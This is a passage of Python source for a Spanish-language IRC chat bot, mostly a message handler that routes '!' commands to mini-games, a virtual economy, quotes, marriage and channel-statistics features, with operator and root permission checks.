    juego_matrimonio = None
    juego_economia = None
    juego_dados = None
    juego_tragaperras = None
    juego_ruletarusa = None
    juego_ruletasuerte = None
    juego_mayormenor = None
    juego_robar = None
    juego_dragones = None
    juego_stats = None
    juego_cofres = None
    juego_respeto = None
    juego_bomba = None
    juego_cartamagica = None
    juego_sorteo = None
    juego_castillo = None
    juego_hechicero = None
    juego_tickets = None
    juego_ahorcado = None
    juego_frases = None
    juego_social = None
    juego_caja = None
    juego_amuletos = None
    juego_nicho = None
    juego_ppt = None
    juego_trileros = None
    juego_fortaleza = None
    juego_quotes = None
    juego_escoba = None
    juego_gremios = None
    juego_bingo = None
    juego_impostor = None
    gestor_permisos = None

# ---------------------------------------------------------------------------
# Manejadores de eventos IRC
# ---------------------------------------------------------------------------

def on_message(client, event) -> None:
    try:
        if not irc.client.is_channel(event.target):
            return

        raw_message     = event.arguments[0]
        cleaned_message = strip_mirc_colors(raw_message)
        channel         = event.target
        nick            = irc.client.NickMask(event.source).nick
        cmd_lower = cleaned_message.strip().lower()

        # --- LOG PARA ESTADÍSTICAS ---
        if juego_stats:
            juego_stats.log_message(channel, nick, cleaned_message)

        # ── EXCEPCIÓN GLOBAL: Horóscopo (funciona siempre, incluso silenciado) ──
        if _responder_horoscopo(channel, cleaned_message, nick):
            return

        # ── GESTIÓN DE CANAL Y PERMISOS (ROOTS/OPERS) ──
        if gestor_permisos:
            if cmd_lower.startswith("!root") or cmd_lower.startswith("!oper") or cmd_lower.startswith("!set"):
                respuestas = gestor_permisos.gestionar_comando(nick, channel, cleaned_message.strip())
                for r in respuestas: safepm(channel, r)
                return

            if gestor_permisos.es_oper(channel, nick):
                msg_lower = cleaned_message.lower()
                nick_lower = nickname.lower()

                _SILENCIO = re.compile(
                    r'\b(c[aá]llate|silencio|no hables?|calla|mutea?te|shut\s*up)\b',
                    re.IGNORECASE
                )
                _DESPERTAR = re.compile(
                    r'\b(habla|ya puedes hablar|puedes hablar|desm[uú]tea?te|sigue|continua|vuelve)\b',
                    re.IGNORECASE
                )

                if (nick_lower in msg_lower and _SILENCIO.search(msg_lower)) or cmd_lower == "!milenium off":
                    with _channel_states_lock:
                        channel_states[channel.lower()] = False
                    _save_channel_states()
                    safepm(channel, "\x0310🔇 De acuerdo, me callo.\x03")
                    return

                if (nick_lower in msg_lower and _DESPERTAR.search(msg_lower)) or cmd_lower == "!milenium on":
                    with _channel_states_lock:
                        channel_states[channel.lower()] = True
                    _save_channel_states()
                    safepm(channel, "\x0303✅ ¡Aquí estoy de nuevo!\x03")
                    return

        # Ignorar si el bot está desactivado en este canal
        if not is_channel_active(channel):
            return

        def feature_active(feat):
            if gestor_permisos:
                return gestor_permisos.get_setting(channel, feat)
            return True

        # --- JUEGOS SOCIALES ---

        # --- ECONOMÍA Y JUEGOS ---
        if juego_economia:
            resp_diarias = juego_economia.check_daily_spins(nick)
            for r in resp_diarias: safepm(channel, r)

            if cmd_lower == "!saldo" or cmd_lower.startswith("!banco") or cmd_lower.startswith("!comprar") or \
               cmd_lower.startswith("!vender") or cmd_lower.startswith("!precio") or cmd_lower.startswith("!transferir") or \
               cmd_lower == "!premio" or cmd_lower == "!bote" or cmd_lower == "!prestamo" or cmd_lower == "!devuelve" or \
               cmd_lower == "!limpiar" or \
               cmd_lower.startswith("!ctickets") or cmd_lower.startswith("!amuleto") or \
               cmd_lower.startswith("!duelo") or cmd_lower.startswith("!aceptar") or cmd_lower.startswith("!maldicion"):

                if not feature_active("juegos"): return

                if cmd_lower == "!saldo":
                    respuestas = juego_economia.comando_saldo(nick)
                    for r in respuestas: safepm(channel, r)
                    return
                elif cmd_lower.startswith("!banco"):
                    args = cleaned_message[len("!banco"):].strip()
                    respuestas = juego_economia.comando_banco(nick, args)
                    for r in respuestas: safepm(channel, r)
                    return
                elif cmd_lower.startswith("!comprar"):
                    args = cleaned_message[len("!comprar"):].strip()
                    respuestas = juego_economia.comando_comprar(nick, args)
                    for r in respuestas: safepm(channel, r)
                    return
                elif cmd_lower.startswith("!ctickets"):
                    args = "tickets " + cleaned_message[len("!ctickets"):].strip()
                    respuestas = juego_economia.comando_comprar(nick, args)
                    for r in respuestas: safepm(channel, r)
                    return
                elif cmd_lower.startswith("!vender"):
                    args = cleaned_message[len("!vender"):].strip()
                    respuestas = juego_economia.comando_vender(nick, args)
                    for r in respuestas: safepm(channel, r)
                    return
                elif cmd_lower.startswith("!precio"):
                    args = cleaned_message[len("!precio"):].strip()
                    respuestas = juego_economia.comando_precio(args)
                    for r in respuestas: safepm(channel, r)
                    return
                elif cmd_lower.startswith("!transferir"):
                    args = cleaned_message[len("!transferir"):].strip()
                    respuestas = juego_economia.comando_transferir(nick, args)
                    for r in respuestas: safepm(channel, r)
                    return
                elif cmd_lower == "!premio" or cmd_lower == ".premio":
                    respuestas = juego_economia.comando_premio(nick)
                    for r in respuestas: safepm(channel, r)
                    return
                elif cmd_lower.startswith("!duelo "):
                    args = cleaned_message[len("!duelo"):].strip()
                    respuestas = juego_economia.comando_duelo(nick, args)
                    for r in respuestas: safepm(channel, r)
                    return
                elif cmd_lower.startswith("!aceptar "):
                    args = cleaned_message[len("!aceptar"):].strip()
                    respuestas = juego_economia.comando_aceptar_duelo(nick, args)
                    for r in respuestas: safepm(channel, r)
                    return
                elif cmd_lower.startswith("!maldicion "):
                    args = cleaned_message[len("!maldicion"):].strip()
                    respuestas = juego_economia.comando_maldicion(nick, args)
                    for r in respuestas: safepm(channel, r)
                    return
                elif cmd_lower == "!bote":
                    respuestas = juego_economia.comando_bote()
                    for r in respuestas: safepm(channel, r)
                    return
                elif cmd_lower.startswith("!amuleto "):
                    args = cleaned_message[len("!amuleto"):].strip()
                    respuestas = juego_amuletos.comando_amuleto(nick, args)
                    for r in respuestas: safepm(channel, r)
                    return
                elif cmd_lower == "!prestamo":
                    respuestas = juego_economia.comando_prestamo(nick)
                    for r in respuestas: safepm(channel, r)
                    return
                elif cmd_lower == "!devuelve":
                    respuestas = juego_economia.comando_devuelve(nick)
                    for r in respuestas: safepm(channel, r)
                    return
                elif cmd_lower == "!limpiar":
                    respuestas = juego_economia.comando_limpiar(nick)
                    for r in respuestas: safepm(channel, r)
                    return
                elif cmd_lower == "!baja" or cmd_lower == ".baja":
                    respuestas = juego_economia.comando_baja(nick)
                    for r in respuestas: safepm(channel, r)
                    return
                elif cmd_lower == "!alta" or cmd_lower == ".alta":
                    u = juego_economia.get_user(nick)
                    safepm(channel, f"✅ \x0312{nick}\x0F, ya estas dado de \x0303ALTA\x0F. ¡Disfruta de los juegos!")
                    return

            if cmd_lower.startswith("!dar "):
                if gestor_permisos and gestor_permisos.es_super_root(nick):
                    args = cleaned_message[len("!dar"):].strip()
                    respuestas = juego_economia.comando_dar(nick, args, gestor_permisos)
                    for r in respuestas: safepm(channel, r)
                    return

        if cmd_lower.startswith("!comandos") or cmd_lower.startswith("!ayuda"):
            args = cleaned_message[len("!comandos"):].strip() if cmd_lower.startswith("!comandos") else cleaned_message[len("!ayuda"):].strip()
            sub = args.lower()
            if not sub:
                safepm(channel, f"\x0306Categorias de ayuda:\x0F !comandos \x02Dragones\x02 - !comandos \x02Castillo\x02 - !comandos \x02Hechicero\x02 - !comandos \x02Juegos\x02 - !comandos \x02Social\x02 - !comandos \x02Economia\x02")
                return

            if sub == "dragones":
                safepm(channel, f"\x0306Comandos Dragones:\x0F !dragon, !morder, !mision, !quemar, !volar, !destruir, !cazar, !matar, !atacar Nick, !bola.fuego Nick, !info dragon")
            elif sub == "castillo":
                safepm(channel, f"\x0306Comandos Castillo:\x0F !Castillo <Nombre>, !minas, !talar, !crear, !construir, !mercader <recurso> <cant>, !invadir Nick, !info almacen/cuartel")
            elif sub == "hechicero":
                safepm(channel, f"\x0306Comandos Hechicero:\x0F !hechicero, !pelear Nick, !Gmision, !capturar, !combate, !conjuro, !info hechicero")
            elif sub == "juegos":
                safepm(channel, f"\x0306Comandos Juegos:\x0F !dados, !tragaperras, !rusa, !ruleta, !robar, !ahorcado, !bola8, !rtgp, !rsuerte, !rpremio, !trileros, !fortaleza")
            elif sub == "social":
                safepm(channel, f"\x0306Comandos Social:\x0F !amorometro, !casarme, !divorcio, !beso Nick, !abrazo Nick, !sexo Nick, !sexometro Nick Nick, !chiste, !piropo, !refran, !murphy")
            elif sub == "economia":
                safepm(channel, f"\x0306Comandos Economia:\x0F !saldo, !banco, !comprar, !vender, !precio, !transferir, !premio, !bote, !top5, !maldicion borrar")
            return

        if juego_dragones and feature_active("juegos"):
            if cmd_lower.startswith("!dragon"):
                args = cleaned_message[len("!dragon"):].strip()
                respuestas = juego_dragones.comando_dragon(nick, args)
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower == "!mision":
                respuestas = juego_dragones.comando_mision(nick)
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower == "!quemar":
                respuestas = juego_dragones.comando_quemar(nick, juego_castillo)
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower == "!volar":
                respuestas = juego_dragones.comando_volar(nick, juego_castillo)
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower == "!destruir":
                respuestas = juego_dragones.comando_destruir(nick, juego_castillo)
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower == "!cazar":
                respuestas = juego_dragones.comando_cazar(nick, juego_castillo)
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower == "!matar":
                respuestas = juego_dragones.comando_matar(nick, juego_castillo)
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower == "!morder":
                respuestas = juego_dragones.comando_morder(nick)
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower.startswith("!atacar") or cmd_lower.startswith("!atac"):
                args = cleaned_message[len("!atacar"):].strip() if cmd_lower.startswith("!atacar") else cleaned_message[len("!atac"):].strip()
                respuestas = juego_dragones.comando_atacar(nick, args)
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower.startswith("!bola.fuego") or cmd_lower.startswith("!bfuego"):
                args = cleaned_message[len("!bola.fuego"):].strip() if cmd_lower.startswith("!bola.fuego") else cleaned_message[len("!bfuego"):].strip()
                respuestas = juego_dragones.comando_bolafuego(nick, args, juego_castillo)
                for r in respuestas: safepm(channel, r)
                return

        if juego_dados and feature_active("juegos") and cmd_lower.startswith("!dados"):
            args = cleaned_message[len("!dados"):].strip()
            respuestas = juego_dados.ejecutar(nick, args)
            for r in respuestas: safepm(channel, r)
            return

        if juego_tragaperras and feature_active("juegos") and cmd_lower.startswith("!traga.perras"):
            args = cleaned_message[len("!traga.perras"):].strip()
            respuestas = juego_tragaperras.ejecutar(nick, args)
            for r in respuestas: safepm(channel, r)
            return

        if juego_ruletasuerte and feature_active("juegos") and (cmd_lower == "!ruleta" or cmd_lower.startswith("!ruleta.suerte")):
            respuestas = juego_ruletasuerte.ejecutar(nick)
            for r in respuestas: safepm(channel, r)
            return

        if juego_ruletarusa and feature_active("juegos") and (cmd_lower == "!rusa" or cmd_lower.startswith("!ruleta.rusa")):
            if cmd_lower == "!rusa":
                args = cleaned_message[len("!rusa"):].strip()
            else:
                args = cleaned_message[len("!ruleta.rusa"):].strip()
            respuestas = juego_ruletarusa.ejecutar(nick, args)
            for r in respuestas: safepm(channel, r)
            return

        if juego_mayormenor and feature_active("juegos") and (cmd_lower.startswith("!mayor") or cmd_lower.startswith("!menor") or cmd_lower.startswith("!numero")):
            args = cleaned_message.strip().split(None, 1)[1] if " " in cleaned_message.strip() else ""
            cmd = cleaned_message.strip().split()[0].lower()
            respuestas = juego_mayormenor.ejecutar(nick, args, cmd)
            for r in respuestas: safepm(channel, r)
            return

        if juego_robar and feature_active("juegos") and cmd_lower.startswith("!robar"):
            args = cleaned_message[len("!robar"):].strip()
            if juego_caja and len(args.split()) == 2 and args.split()[1].isdigit() and len(args.split()[1]) == 4:
                respuestas = juego_caja.robar(nick, args)
            else:
                respuestas = juego_robar.ejecutar(nick, args)
            for r in respuestas: safepm(channel, r)
            return

        if juego_caja and feature_active("juegos") and cmd_lower == "!pistascaja":
            safepm(channel, "\x0304Pistas Caja Fuerte:\x0F Codigo de 4 digitos (1000-9999). 5 intentos.")
            safepm(channel, "\x0303Verde\x0F: Posicion correcta. \x0307Naranja\x0F: Existe pero mal sitio. \x0304Rojo\x0F: No existe.")
            return

        if juego_cofres and feature_active("juegos") and (cmd_lower == "!cofre" or cmd_lower == ".cofre"):
            respuestas = juego_cofres.ejecutar(nick, "")
            for r in respuestas: safepm(channel, r)
            return

        if juego_respeto and feature_active("juegos") and cmd_lower.startswith("!respeto"):
            respuestas = juego_respeto.ejecutar(nick, "")
            for r in respuestas: safepm(channel, r)
            return

        if juego_sorteo and feature_active("juegos") and cmd_lower.startswith("!sorteo"):
            c = client.channels.get(channel.lower())
            nicks = list(c.users()) if c else []
            respuestas = juego_sorteo.ejecutar(channel, nick, nicks)
            for r in respuestas: safepm(channel, r)
            return

        if juego_tickets and feature_active("juegos"):
            if cmd_lower.startswith("!rtgp") or cmd_lower.startswith(".rtgp"):
                respuestas = juego_tickets.rtgp(nick)
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower.startswith("!rsuerte") or cmd_lower.startswith(".rsuerte"):
                respuestas = juego_tickets.rsuerte(nick)
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower.startswith("!rpremio") or cmd_lower.startswith(".rpremio"):
                respuestas = juego_tickets.rpremio(nick)
                for r in respuestas: safepm(channel, r)
                return

        if juego_castillo and feature_active("juegos"):
            if cmd_lower.startswith("!castillo"):
                args = cleaned_message[len("!castillo"):].strip()
                respuestas = juego_castillo.comando_castillo(nick, args)
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower == "!minas":
                respuestas = juego_castillo.comando_minas(nick)
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower == "!beber":
                respuestas = juego_castillo.comando_beber(nick, juego_dragones, juego_hechicero)
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower == "!talar":
                respuestas = juego_castillo.comando_talar(nick)
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower == "!construir":
                respuestas = juego_castillo.comando_construir(nick)
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower.startswith("!contratar"):
                args = cleaned_message[len("!contratar"):].strip()
                respuestas = juego_castillo.comando_contratar(nick, args)
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower.startswith("!invadir"):
                args = cleaned_message[len("!invadir"):].strip()
                respuestas = juego_castillo.comando_invadir(nick, args)
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower == "!crear":
                respuestas = juego_castillo.comando_crear(nick)
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower.startswith("!mercader"):
                args = cleaned_message[len("!mercader"):].strip()
                respuestas = juego_castillo.comando_mercader(nick, args)
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower.startswith("!info"):
                args = cleaned_message[len("!info"):].strip()
                if args.lower().startswith("almacen") or args.lower().startswith("cuartel"):
                    respuestas = juego_castillo.comando_info(nick, args)
                elif args.lower().startswith("hechicero"):
                    respuestas = juego_hechicero.comando_infohechicero(nick, args[len("hechicero"):].strip())
                elif args.lower().startswith("dragon"):
                    respuestas = juego_dragones.comando_infodragon(nick, args[len("dragon"):].strip())
                else:
                    return
                for r in respuestas: safepm(channel, r)
                return

        if juego_castillo and feature_active("juegos") and cmd_lower.startswith("!fundar"):
            args = cleaned_message[len("!fundar"):].strip()
            respuestas = juego_castillo.comando_fundar(nick, args)
            for r in respuestas: safepm(channel, r)
            return

        if juego_hechicero and feature_active("juegos"):
            if cmd_lower.startswith("!hechicero"):
                args = cleaned_message[len("!hechicero"):].strip()
                respuestas = juego_hechicero.comando_hechicero(nick, args)
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower == "!gremios":
                respuestas = juego_gremios.comando_gremios()
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower.startswith("!gremio "):
                args = cleaned_message[len("!gremio"):].strip()
                respuestas = juego_gremios.comando_gremio_info(args)
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower.startswith("!cgre "):
                args = cleaned_message[len("!cgre"):].strip()
                respuestas = juego_gremios.comando_entrar(nick, args, gestor_permisos)
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower.startswith("!miembro "):
                args = cleaned_message[len("!miembro"):].strip()
                respuestas = juego_gremios.comando_add_miembro(nick, args, gestor_permisos)
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower == "!conjuro":
                respuestas = juego_hechicero.comando_conjuro(nick, juego_castillo)
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower.startswith("!pelear"):
                args = cleaned_message[len("!pelear"):].strip()
                respuestas = juego_hechicero.comando_pelear(nick, args, juego_castillo)
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower == "!gmision":
                respuestas = juego_hechicero.comando_gmision(nick)
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower == "!capturar":
                respuestas = juego_hechicero.comando_capturar(nick, juego_castillo)
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower == "!combate":
                respuestas = juego_hechicero.comando_combate(nick, juego_castillo)
                for r in respuestas: safepm(channel, r)
                return

        if juego_ahorcado and feature_active("juegos"):
            if cmd_lower.startswith("!ahorcado"):
                respuestas = juego_ahorcado.iniciar(channel)
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower.startswith("!letra"):
                args = cleaned_message.strip().split()
                if len(args) < 2:
                    safepm(channel, "Uso: !letra <L>")
                    return
                respuestas = juego_ahorcado.adivinar_letra(channel, nick, args[1])
                for r in respuestas: safepm(channel, r)
                return

        if juego_frases:
            if cmd_lower.startswith("!chiste"):
                respuestas = juego_frases.comando_chiste()
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower.startswith("!piropo"):
                respuestas = juego_frases.comando_piropo()
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower.startswith("!refran"):
                respuestas = juego_frases.comando_refran()
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower.startswith("!murphy"):
                respuestas = juego_frases.comando_murphy()
                for r in respuestas: safepm(channel, r)
                return

        if juego_social:
            if cmd_lower.startswith("!bola8") or cmd_lower.startswith(".bola8"):
                args = cleaned_message[len("!bola8"):].strip()
                respuestas = juego_social.bola8(nick, args)
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower.startswith("!beso"):
                args = cleaned_message[len("!beso"):].strip()
                respuestas = juego_social.beso(nick, args)
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower.startswith("!abrazo"):
                args = cleaned_message[len("!abrazo"):].strip()
                respuestas = juego_social.abrazo(nick, args)
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower.startswith("!sexometro ") or cmd_lower.startswith("!sexom ") or cmd_lower.startswith(".sexom "):
                prefix = "!sexometro" if cmd_lower.startswith("!sexometro") else "!sexom" if cmd_lower.startswith("!sexom") else ".sexom"
                args = cleaned_message[len(prefix):].strip()
                respuestas = juego_social.sexom(nick, args)
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower.startswith("!sexo"):
                args = cleaned_message[len("!sexo"):].strip()
                respuestas = juego_social.sexo(nick, args)
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower == "!cuerdas":
                safepm(channel, f"Para Jugar Al Juego De Las Cuerdas Usa: \x02!cuerda.derecha\x02, \x02!cuerda.medio\x02 o \x02!cuerda.izquierda\x02")
                return
            elif cmd_lower.startswith("!cuerda."):
                lado = cmd_lower[len("!cuerda."):]
                respuestas = juego_nicho.cuerdas(nick, lado)
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower == "!sorpresa":
                respuestas = juego_nicho.sorpresa(nick)
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower == "!piedra" or cmd_lower == "!papel" or cmd_lower == "!tijeras":
                respuestas = juego_ppt.ejecutar(nick, cmd_lower[1:])
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower.startswith("!kill") and feature_active("juegos"):
                args = cleaned_message[len("!kill"):].strip()
                if args and juego_impostor:
                    ok, public, private = juego_impostor.kill(nick, args)
                    safepm(channel, public)
                    for n, msg in private.items():
                        safenotice(n, msg)
                return
            elif cmd_lower.startswith("!tarea") and feature_active("juegos"):
                args = cleaned_message[len("!tarea"):].strip()
                if args and juego_impostor:
                    num = args.split()[0]
                    if num.isdigit():
                        ok, public, private = juego_impostor.complete_task(nick, int(num))
                        safepm(channel, public)
                        for n, msg in private.items():
                            safenotice(n, msg)
                return
            elif cmd_lower.startswith("!voto") and feature_active("juegos"):
                args = cleaned_message[len("!voto"):].strip()
                if args and juego_impostor:
                    ok, public, private = juego_impostor.vote(nick, args)
                    safepm(channel, public)
                    for n, msg in private.items():
                        safenotice(n, msg)
                return
            elif cmd_lower.startswith("!bingo") and feature_active("juegos"):
                if not juego_bingo: return
                args = cleaned_message[len("!bingo"):].strip().lower()
                if not args:
                    ok, public, private = juego_bingo.join(nick)
                elif args == "salir" or args == "leave":
                    ok, public, private = juego_bingo.leave(nick)
                elif args == "empezar" or args == "start":
                    ok, public, private = juego_bingo.start()
                elif args == "bola" or args == "sorteo":
                    ok, public, private = juego_bingo.draw()
                elif args == "carton" or args == "card":
                    ok, public, private = juego_bingo.get_card(nick)
                elif args.startswith("linea") or args.startswith("bingo"):
                    ok, public, private = juego_bingo.check_bingo(nick)
                elif args == "numeros" or args == "status":
                    public = juego_bingo.drawn_numbers()
                    private = {}
                elif args == "reset":
                    ok, public, private = juego_bingo.reset()
                else:
                    public = "Uso: !bingo | !bingo salir | !bingo empezar | !bingo bola | !bingo carton | !bingo linea | !bingo numeros | !bingo reset"
                    private = {}
                safepm(channel, public)
                for n, msg in private.items():
                    safenotice(n, msg)
                return
            elif cmd_lower.startswith("!trileros"):
                if juego_trileros and feature_active("juegos"):
                    args = cleaned_message[len("!trileros"):].strip()
                    respuestas = juego_trileros.ejecutar(nick, args)
                    for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower.startswith("!fortaleza"):
                if juego_fortaleza and feature_active("juegos"):
                    args = cleaned_message[len("!fortaleza"):].strip().lower()
                    if args == "stop":
                        modo, respuestas = juego_fortaleza.detener(nick)
                        if modo:
                            client.send_raw(modo)
                        for r in respuestas: safepm(channel, r)
                    elif args == "pista" or args == "ayuda":
                        pista = juego_fortaleza.pista(nick)
                        if pista:
                            safenotice(nick, pista)
                        else:
                            safepm(channel, "No hay desafío activo para ti.")
                    elif args == "rendirse" or args == "abandonar":
                        modo, respuestas = juego_fortaleza.fallar(nick)
                        if modo:
                            client.send_raw(modo)
                        for r in respuestas: safepm(channel, r)
                    elif not args:
                        modo, respuestas = juego_fortaleza.iniciar(channel, nick)
                        if modo:
                            client.send_raw(modo)
                            client.send_raw(f"KICK {channel} {nick} :¡La Fortaleza te espera!")
                        for r in respuestas: safepm(channel, r)
                    else:
                        safepm(channel, "Uso: !fortaleza | !fortaleza stop | !fortaleza pista | !fortaleza rendirse")
                return
            elif cmd_lower == "!escoba":
                respuestas = juego_escoba.iniciar(channel)
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower == "!jugador.1":
                respuestas = juego_escoba.registro(channel, nick, 1)
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower == "!jugador.2":
                respuestas = juego_escoba.registro(channel, nick, 2)
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower == "!addquote" or cmd_lower == "!quoteadd":
                args = cleaned_message[len(cmd_lower):].strip()
                if not args:
                    safepm(channel, "Uso: !addquote <texto>")
                else:
                    respuestas = juego_quotes.add_quote(channel, nick, args)
                    for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower == "!delquote" or cmd_lower == "!quotedel":
                args = cleaned_message[len(cmd_lower):].strip()
                is_admin = gestor_permisos.es_oper(channel, nick) if gestor_permisos else False
                respuestas = juego_quotes.del_quote(channel, nick, args, is_admin)
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower == "!quote":
                args = cleaned_message[len("!quote"):].strip()
                respuestas = juego_quotes.get_quote(channel, args)
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower == "!busca.quote" or cmd_lower == "!busca":
                args = cleaned_message[len(cmd_lower):].strip()
                respuestas = juego_quotes.buscar_quote(channel, args)
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower == "!quoteinfo" or cmd_lower == "!infoquote":
                args = cleaned_message[len(cmd_lower):].strip()
                respuestas = juego_quotes.info_quote(channel, args)
                for r in respuestas: safepm(channel, r)
                return
            elif cmd_lower == "!uptime":
                diff = int(time.time())
                dias = diff // 86400
                horas = (diff % 86400) // 3600
                mins = (diff % 3600) // 60
                safepm(channel, f"\U0001f552 \x02Uptime:\x02 Llevo conectado \x02{dias}d {horas}h {mins}m\x02.")
                return

        if cmd_lower.startswith("!mg "):
            if gestor_permisos and gestor_permisos.es_super_root(nick):
                msg_global = cleaned_message[len("!mg"):].strip()
                print(f"[MG] {nick} envia: {msg_global}")
                for chan in client.channels.keys():
                    client.privmsg(chan, f"\x0306\x02[AVISO GLOBAL]\x0F \x0312{msg_global}\x0F")
            return

        if juego_amorometro and feature_active("amorometro") and cmd_lower.startswith("!amorometro"):
            cmd_idx = raw_message.lower().find("!amorometro")
            if cmd_idx != -1:
                args = raw_message[cmd_idx + len("!amorometro"):].strip()
            else:
                args = cleaned_message[len("!amorometro"):].strip()
            respuestas = juego_amorometro.ejecutar(nick, args)
            for r in respuestas:
                safepm(channel, r)
            return

        if juego_matrimonio and feature_active("matrimonio"):
            if cmd_lower.startswith("!casarme"):
                args = cleaned_message.strip()[len("!casarme"):].strip()
                respuestas = juego_matrimonio.comando_casarme(nick, args)
                for r in respuestas:
                    safepm(channel, r)
                return
            elif cmd_lower.startswith("!si.quiero"):
                args = cleaned_message.strip()[len("!si.quiero"):].strip()
                respuestas = juego_matrimonio.comando_siquiero(nick, args)
                for r in respuestas:
                    safepm(channel, r)
                return
            elif cmd_lower.startswith("!no.quiero"):
                args = cleaned_message.strip()[len("!no.quiero"):].strip()
                respuestas = juego_matrimonio.comando_noquiero(nick, args)
                for r in respuestas:
                    safepm(channel, r)
                return
            elif cmd_lower.startswith("!divorciarme"):
                args = cleaned_message.strip()[len("!divorciarme"):].strip()
                respuestas = juego_matrimonio.comando_divorciarme(nick, args)
                for r in respuestas:
                    safepm(channel, r)
                return
            elif cmd_lower.startswith("!si.divorcio"):
                args = cleaned_message.strip()[len("!si.divorcio"):].strip()
                respuestas = juego_matrimonio.comando_sidivorcio(nick, args)
                for r in respuestas:
                    safepm(channel, r)
                return
            elif cmd_lower.startswith("!estado.civil"):
                args = cleaned_message.strip()[len("!estado.civil"):].strip()
                respuestas = juego_matrimonio.comando_estadocivil(nick, args)
                for r in respuestas:
                    safepm(channel, r)
                return

        if cmd_lower == "!stats" or cmd_lower == ".stats":
            if not feature_active("stats"):
                return
            if gestor_permisos and not gestor_permisos.es_oper(channel, nick):
                safenotice(nick, "\x0304Acceso denegado!\x03 No tienes permisos de Oper.")
                return
            if juego_stats:
                respuestas = juego_stats.generar_reporte(channel, nick)
                for r in respuestas: safepm(channel, r)
            return

        if cmd_lower == "!libera":
            if not feature_active("stats"):
                return
            if not juego_stats: return
            es_root = gestor_permisos and gestor_permisos.es_root(channel, nick)
            es_staff = nick in admin_nicks
            if not es_root and not es_staff:
                safepm(channel, f"\x0304⛔ {nick}: Solo roots del canal o staff del bot.\x03")
                return
            safepm(channel, f"\x0310Generando estadísticas para {channel}...\x03")
            respuestas = juego_stats.generar_html(channel, nick, excluir_nicks=["MaLeFiCo", "Heimdall"])
            for r in respuestas: safepm(channel, r)
            return

        if cmd_lower == "!lineas":
            if not feature_active("stats"):
                return
            if juego_stats:
                args = cleaned_message[len("!lineas"):].strip()
                target = args if args else nick
                respuestas = juego_stats.obtener_lineas(channel, target)
                for r in respuestas: safepm(channel, r)
            return

        if cmd_lower.startswith("!vip"):
            if not feature_active("stats"):
                return
            if not juego_stats: return
            args = cleaned_message[len("!vip"):].strip()
            respuestas = juego_stats.comando_vip(nick, args)
            for r in respuestas: safepm(channel, r)
            return

        if cmd_lower.startswith("!top5"):
            if not feature_active("stats"):
                return
            n = 5
            args = cleaned_message.strip().split()
            if len(args) < 2:
                safepm(channel, f"Sintaxis incorrecta: !top5 LINEAS/WINIS/TICKETS/LINGOTES/DIAMANTES/FICHAS/LLAVES/MALDICIONES/BOTES/ESMERALDAS")
                return
            cat = args[1].lower()
            if cat == "lineas":
                if juego_stats:
                    respuestas = juego_stats.comando_top(channel, n)
                    for r in respuestas: safepm(channel, r)
            elif cat in ["winis", "fichas", "euros", "tickets", "lingotes", "diamantes", "esmeraldas", "llaves", "maldiciones", "botes"]:
                if not feature_active("juegos"): return
                if juego_economia:
                    respuestas = juego_economia.get_top_items(cat, n)
                    for r in respuestas: safepm(channel, r)
            if cat == "oro" or cat == "soldados" or cat == "torres":
                if not feature_active("juegos"): return
                if juego_castillo:
                    respuestas = juego_economia.get_rpg_top(cat, juego_castillo.castillos, cat.capitalize(), n)
                    for r in respuestas: safepm(channel, r)
            if cat == "dragon":
                if not feature_active("juegos"): return
                if juego_dragones:
                    respuestas = juego_economia.get_rpg_top("lvl", juego_dragones.dragones, "Nivel Dragon", n)
                    for r in respuestas: safepm(channel, r)
            if cat == "hechicero":
                if not feature_active("juegos"): return
                if juego_hechicero:
                    respuestas = juego_economia.get_rpg_top("lvl", juego_hechicero.datos, "Nivel Hechicero", n)
                    for r in respuestas: safepm(channel, r)
            return

        if cleaned_message.startswith("!autojoin"):
            handle_autojoin_command(client, event, cleaned_message)
            return

        if cleaned_message.strip().lower() == "!olvida":
            if nick not in admin_nicks:
